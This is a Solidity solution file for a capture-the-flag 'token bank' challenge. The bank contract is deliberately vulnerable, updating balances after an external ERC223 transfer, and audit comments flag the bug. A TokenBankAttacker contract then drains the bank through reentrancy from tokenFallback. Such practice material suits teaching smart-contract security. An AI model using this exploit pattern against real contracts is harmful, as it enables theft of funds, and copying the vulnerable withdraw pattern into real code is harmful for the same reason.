// I created a token bank. It allows anyone to deposit tokens by transferring them to the bank and then to withdraw those tokens later.
// It uses ERC 223 to accept the incoming tokens.

// The bank deploys a token called “Simple ERC223 Token” and assigns half the tokens to me and half to you.
// You win this challenge if you can empty the bank.

pragma solidity ^0.4.21;

interface ITokenReceiver {
    function tokenFallback(address from, uint256 value, bytes data) external;
}

contract SimpleERC223Token {
    // Track how many tokens are owned by each address.
    mapping(address => uint256) public balanceOf;

    string public name = "Simple ERC223 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    function SimpleERC223Token() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function isContract(address _addr) private view returns (bool is_contract) {
        uint length;
        assembly {
            //retrieve the size of the code on target address, this needs assembly
            length := extcodesize(_addr)
        }
        return length > 0;
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        bytes memory empty;
        return transfer(to, value, empty);
    }

    function transfer(
        address to,
        uint256 value,
        bytes data
    ) public returns (bool) {
        // requires the sender to have more than the requested value
        require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);

        // fallback function
        // no-reentrancy vector
        if (isContract(to)) {
            // caller address, value

            // tokenFallback could call again withdraw, transfering the total supply from the
            // main contract to the attacker contract
            ITokenReceiver(to).tokenFallback(msg.sender, value, data);
        }
        return true;
    }

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(
        address spender,
        uint256 value
    ) public returns (bool success) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    // doesn't depend on the transfer function
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public returns (bool success) {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
}

contract TokenBankChallenge {
    SimpleERC223Token public token;
    mapping(address => uint256) public balanceOf;

    function TokenBankChallenge(address player) public {
        // creates token instance
        // @note assigns the total supply of tokens to this contract's address
        token = new SimpleERC223Token();

        // Divide up the 1,000,000 tokens, which are all initially assigned to
        // the token contract's creator (this contract).
        // @note this doesn't change the token.balanceOf
        // so, token.balanceOf(contract) is still 1mil
        // token.balanceOf(msg.sender) is 0
        // token.balanceOf(player) is 0
        balanceOf[msg.sender] = 500000 * 10 ** 18; // half for me
        balanceOf[player] = 500000 * 10 ** 18; // half for you
    }

    function isComplete() public view returns (bool) {
        // complete if the TOKEN's balance is changed
        return token.balanceOf(this) == 0;
    }

    function tokenFallback(address from, uint256 value, bytes) public {
        // @note can only be called by the token contract
        require(msg.sender == address(token));
        require(balanceOf[from] + value >= balanceOf[from]);

        balanceOf[from] += value;
    }

    function withdraw(uint256 amount) public {
        require(balanceOf[msg.sender] >= amount);

        // @audit the msg.sender in the token contract is this contract
        // balanceOf updated after transfer operation
        // reentrant?
        // REENTRANCY WOULD BE AN EXPLOIT HERE, IF THE MSG.SENDER IS A CONTRACT
        require(token.transfer(msg.sender, amount));
        balanceOf[msg.sender] -= amount;
    }
}

contract TokenBankAttacker {
    TokenBankChallenge bankContract;
    bool fundsRetired;

    function setBankContract(address _bankAddr) public {
        bankContract = TokenBankChallenge(_bankAddr);
    }

    function getFundsFromBank() private {
        uint256 amount = 500000 * 10 ** 18;
        bankContract.withdraw(amount);
        fundsRetired = true;
    }

    function tokenFallback(address from, uint256 value, bytes) public {
        if (
            SimpleERC223Token(bankContract.token()).balanceOf(bankContract) == 0
        ) {
            return;
        }

        getFundsFromBank();
    }

    function attack() public {
        getFundsFromBank();
    }
}
